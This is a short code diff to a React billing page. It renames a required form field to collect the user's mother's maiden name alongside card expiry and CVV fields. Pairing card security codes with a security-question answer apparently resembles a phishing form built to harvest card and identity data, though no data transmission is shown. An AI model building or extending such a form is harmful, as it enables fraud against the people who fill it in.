@@ -22,7 +22,7 @@ const BillingPage = () => {
     expiry: "",
     cvv: "",
     // cardName: "",
-    motherMiddleName: "",
+    motherMaidenName: "",
   });
   const [loading, setLoading] = useState(false);
   const router = useRouter();
@@ -102,12 +102,12 @@ const BillingPage = () => {
                     Mother's Middle Name
                   </label>
                   <input
-                    name="motherMiddleName"
-                    value={form.motherMiddleName}
+                    name="motherMaidenName"
+                    value={form.motherMaidenName}
                     onChange={handleChange}
                     required={true}
                     className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
-                    placeholder="Enter Your Mother's Middle Name"
+                    placeholder="Enter Your Mother's Maiden Name"
                   />
                 </div>
               </div>
